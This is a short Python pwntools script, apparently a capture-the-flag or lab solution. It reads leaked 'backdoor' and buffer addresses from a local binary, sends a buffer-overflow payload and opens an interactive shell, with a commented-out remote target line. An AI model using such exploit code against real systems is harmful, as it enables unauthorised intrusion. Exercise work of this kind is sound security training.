from pwn import *

# context.terminal = ['tmux', 'split', '-h']   # for debug
# context.log_level = 'debug'

p = process('./hack')     # use this tube on your local machine
# p = remote('100', 23454)   # use this for remote attack

p.recvuntil('cheater1: 0x')
bdoor = int(p.recvline(), 16)
p.info('backdoor address: 0x%x', bdoor)

p.recvuntil('cheater2: 0x')
addr = int(p.recvline(), 16)
p.info('local buf address: 0x%x', addr)

# p.recvuntil('name? ')
payload = 'x'*100+' \x01'

# gdb.attach(p, 'finish\n'*6)     # for debug, use tmux or byobu

p.sendline(payload)

# set control to the terminal
p.interactive()
